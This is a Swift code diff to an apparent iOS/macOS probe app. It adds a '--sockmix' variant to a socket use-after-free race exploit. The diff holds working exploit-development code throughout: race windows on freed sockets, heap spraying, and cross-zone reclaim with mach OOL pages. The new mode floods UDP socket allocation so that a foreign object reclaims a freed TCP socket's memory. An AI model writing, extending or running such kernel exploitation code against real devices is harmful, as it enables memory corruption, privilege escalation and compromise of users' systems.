@@ -140,7 +140,8 @@ final class ReachViewModel: ObservableObject {
         if args.contains("--webscan") { await runWebScanMode(); return }
         if args.contains("--sockuaf") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--sockool") || args.contains("--sockxz") || args.contains("--sockgc")
-            || args.contains("--sockudp") || args.contains("--sockprec") { Task.detached { await self.runSocketUafMode() }; return }
+            || args.contains("--sockudp") || args.contains("--sockprec")
+            || args.contains("--sockmix") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--autorun") { emit("AGXProbe v123 ready (use --webscan)") }
     }
 
@@ -835,7 +836,7 @@ func runFuzzMode() async {
     nonisolated func sockUafRacePrecision(_ st: SockUafState, _ target: Int32,
                                           _ it: Int, _ precPort: Int,
                                           _ peers: inout [Int32], _ peerLock: NSLock,
-                                          _ udp: Bool = false) -> Bool {
+                                                                                _ udp: Bool = false, _ mixUdp: Bool = false) -> Bool {
         let n = 6
         st.fd = target
         st.done = 0
@@ -863,7 +864,19 @@ func runFuzzMode() async {
             for fd in spray { _ = send(fd, &one, 1, MSG_DONTWAIT) }
         }
         var w = 0
-        while st.done < Int32(n) && w < 200_000 { w &+= 1 }
+        if mixUdp {
+            // Cross-type contention: hammer datagram-socket allocation during the window
+            // where the victim has been freed but the stale senders may still be inside
+            // their syscall. A UDP socket landing in the victim's slot means the stale TCP
+            // send then operates on a foreign protocol object instead of a sibling TCP one.
+            while st.done < Int32(n) && w < 200_000 {
+                let u = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
+                if u >= 0 { close(u) }
+                w &+= 1
+            }
+        } else {
+            while st.done < Int32(n) && w < 200_000 { w &+= 1 }
+        }
         st.gate = 0
         st.phase = 0
         st.fd = -1
@@ -1133,7 +1146,8 @@ func runFuzzMode() async {
         let gcOnly = ProcessInfo.processInfo.arguments.contains("--sockgc")
         let udpOnly = ProcessInfo.processInfo.arguments.contains("--sockudp")
         let precOnly = ProcessInfo.processInfo.arguments.contains("--sockprec")
-        let solo = oolOnly || xzOnly || gcOnly || udpOnly || precOnly
+        let mixOnly = ProcessInfo.processInfo.arguments.contains("--sockmix")
+        let solo = oolOnly || xzOnly || gcOnly || udpOnly || precOnly || mixOnly
         var hits = 0
         let t0 = Date()
         var maxAfterClose: Int32 = 0
@@ -1158,11 +1172,14 @@ func runFuzzMode() async {
         }
 
         for it in 0..<iterations {
-            if solo ? (hits >= 1 && it > 40) : hits >= 20 { break }
+            // --sockmix keeps running: its signal is a panic or anomaly from a
+            // cross-type collision, not a peer-delivery hit, so stopping at the
+            // first normal hit would throw away the remaining attempts.
+            if solo ? (!mixOnly && hits >= 1 && it > 40) : hits >= 20 { break }
             // NB: r==5 is the cross-zone reclaim (mach OOL), r==6 is the page-free
             // block, r==7 is batch GC. The solo flags used to be swapped here, so
             // --sockool ran the page-free variant and vice versa.
-            let r = oolOnly ? 5 : (xzOnly ? 6 : (gcOnly ? 7 : (udpOnly ? 8 : (precOnly ? 4 : it % 5))))
+            let r = oolOnly ? 5 : (xzOnly ? 6 : (gcOnly ? 7 : (udpOnly ? 8 : ((precOnly || mixOnly) ? 4 : it % 5))))
             // Return a batch of held sockets so their pages go back to the page
             // allocator, giving the OOL spray fresh memory to occupy.
             if solo && !exhaustFds.isEmpty && it % 2 == 0 {
@@ -1222,7 +1239,7 @@ func runFuzzMode() async {
                 // ---- variant E: one burst per sender, peer-delivery oracle ----
                 let target = sockUafMakeSocket(ip, port)
                 if target >= 0 {
-                    if sockUafRacePrecision(st, target, it, precPort, &precPeers, peerLock) { hits += 1 }
+                    if sockUafRacePrecision(st, target, it, precPort, &precPeers, peerLock, false, mixOnly) { hits += 1 }
                 }
             } else if r == 5 {
                 // ---- variant F: cross-zone reclaim with mach OOL pages ----
